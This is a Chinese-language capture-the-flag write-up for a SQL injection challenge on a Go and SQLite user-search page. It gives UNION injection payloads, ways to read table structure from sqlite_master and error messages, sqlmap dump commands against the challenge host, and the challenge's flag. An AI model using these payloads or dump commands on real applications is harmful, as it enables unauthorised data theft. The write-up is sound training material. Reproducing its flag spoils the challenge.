# WP · qsnctf 40799 — Go + SQLite 联合注入（报错泄露表结构）

> 分类：10-SQL注入 ｜ 后端：Go (database/sql) + SQLite ｜ 难度：入门~中等（报错信息是最大助攻）
> 地址：`http://challenge.qsnctf.com:40799/search`（POST）
> **Flag：`flag{9f2951b8f2d249c39de126c1cb34d43d}`**

---

## 0. 一句话思路
搜索框 `query` 存在 SQL 注入（SQLite `LIKE '%q%'` 拼接）→ UNION 注入枚举库表 → 报错信息泄露列类型/表名 → 找到 `flags` 表（列 `value`）→ 拖出 flag。

## 1. 侦察（信息收集）
- 首页：用户搜索系统，表单 POST 到 `/search`（GET /search 直接 405）。
- `query=test'` 报错：**`查询错误: near "'%'": syntax error`** ← SQLite 语法错误格式 → 注入点确认。
- 注入形式：`WHERE username LIKE '%{q}%' OR email LIKE '%{q}%'`（字符串拼接，非参数化）。
- 后端身份：`sql: Scan error on column index 0, name "id": converting driver.Value type string ("flags") to a int` ← **Go database/sql** 报错（CTF 少见，但报错白送列名+类型）。

## 2. 注入验证
```
query=%' OR 1=1 --      → 拖出全部用户（alice/bob/charlie/david/eve）
query=%' UNION SELECT 1,2,3 --   → 列数=3（id, username, email）
```
注意：结果表把三列渲染成 ID / 用户名 / 邮箱。

## 3. 枚举表结构（步步踩坑）
| payload | 结果/教训 |
|---|---|
| `UNION SELECT name, NULL, NULL FROM sqlite_master` | 报错 `type string ("flags") to a int` → **第1列是 int**，字符串放进去炸 |
| `UNION SELECT 0, name, '' FROM sqlite_master WHERE type='table'` | ✅ 表清单：`flags` / `sqlite_sequence` / `users` |
| `UNION SELECT 0, sql, '' FROM sqlite_master WHERE name='flags'` | ✅ 建表语句：`CREATE TABLE flags (id INTEGER, value TEXT NOT NULL)` → **列名是 value 不是 flag** |

**Go 扫描的两个坑**：
1. id 列是 int，UNION 里放字符串 → `Scan error`（把字符串挪到 username 列即可）；
2. NOT NULL 列不接收 NULL → 用 `''` 空字符串代替 NULL。

## 4. 拖 flag
```
query=%' UNION SELECT 0, value, '' FROM flags --
```
返回：
```
flag{9f2951b8f2d249c39de126c1cb34d43d}
```

## 5. 复盘 & 套路沉淀
1. **SQLite 识别**：错误 `near "xxx": syntax error` = SQLite 特征（MySQL 是 `You have an error in your SQL syntax`）。
2. **Go 识别**：`sql: Scan error ... converting ... to a int` = Go database/sql + 报错泄露列名/类型——**报错就是探针**。
3. **UNION 列序纪律**：先 `1,2,3` 定列数，再按"目标列的类型"安排 UNION 值（int 列放数字、string 列放字符串、NOT NULL 放 `''`）。
4. **表结构三件套**：`sqlite_master` 的 `name`（表名）+ `sql`（建表语句，免费 schema）+ `type='table'` 过滤。
5. **别猜列名**：先读建表语句拿真实列名（这题 `flag` 列叫 `value`，猜 `flag` 就踩空）。

## 6. sqlmap 复现（实测通过）
```bash
# ① 识别（秒级）：UNION 注入、3 列、SQLite
python sqlmap.py -u "http://challenge.qsnctf.com:40799/search" --data "query=test" --batch --dbs
#   注意：SQLite 提示不支持 --dbs，直接用 --tables
# ② 表清单
python sqlmap.py -u "http://challenge.qsnctf.com:40799/search" --data "query=test" --batch --tables
# ③ 倒库（★列枚举失败 → 手动 -C 指定列）
python sqlmap.py -u "http://challenge.qsnctf.com:40799/search" --data "query=test" --batch -T flags -C value --dump
```
**sqlmap 的两个坑**：
1. SQLite 是单文件库，不能 `--dbs`（要直接 `--tables`）；
2. `flags` 表**列枚举失败**（多行缩进的建表语句 sqlmap 解析不动 + Go 严格扫描对 NULL 敏感）→ 用 `-C value` 手动指定列名绕过。

**纯 sqlmap 不猜列名的替代路线**（实测通过）：
```bash
# 先用 --sql-query 让 sqlmap 自己读建表语句（列名出现在它自己的输出里）
python sqlmap.py -u "http://challenge.qsnctf.com:40799/search" --data "query=test" --batch \
  --sql-query "SELECT sql FROM sqlite_master WHERE name='flags'"
# → 'CREATE TABLE flags (\n id INTEGER PRIMARY KEY AUTOINCREMENT,\n value TEXT NOT NULL\n)'
# 再 -C value 指定列拖数据（同上③）
```
（`SELECT *` 展开需要列名，这题展开失败；`--sql-query` 读系统表是万能兜底。）

**手工 vs sqlmap 的分工**：手工（本 WP 前面的打法）从报错里直接看到了建表语句和列名，比工具更快拿到"表结构情报"；sqlmap 负责确认和秒拖数据。做题先手工理解，再 sqlmap 提速验证。
